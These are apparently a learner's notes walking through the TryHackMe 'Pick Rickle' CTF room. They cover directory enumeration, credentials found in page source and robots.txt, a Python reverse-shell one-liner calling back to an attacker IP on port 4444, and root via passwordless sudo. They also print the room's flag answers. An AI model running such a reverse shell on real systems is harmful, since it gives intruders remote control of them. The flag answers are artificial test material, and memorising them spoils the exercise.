https://tryhackme.com/room/picklerick

first we do an nmap to see what ports are open

we see theres an ssh and http, the http shows a page saying that we need to login to the computer
im going to use [[Gobuster]] to enumerate more potential pages
`gobuster dir --url $ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

we find the robots.txt which just says "Wubbalubbadubdub" and also a login.php

inspecting the html code theres a comment giving us the username R1ckRul3s

using this user and the robots.txt as a password we get access

we get a command pannel where we can execute commands
we can check if python is running with the command which python3
using [[Reverse Shell Generator]] we generate a python3 rev shell and run it

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.54.71",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

`
now with the rev shell we can cat the first ingrident in the current directory,
getting the flag mr. meeseek hair

theres also clue.txt which tells us to further explore the filesystem to find the next flag

so we cd to the home dir to get the second flag 1 jerry tear 

for the final flag we check for sudo using sudo -l we can see that sudo has no password so we can get root with sudo su, now we can cd to root and find the 3rd flag fleeb juice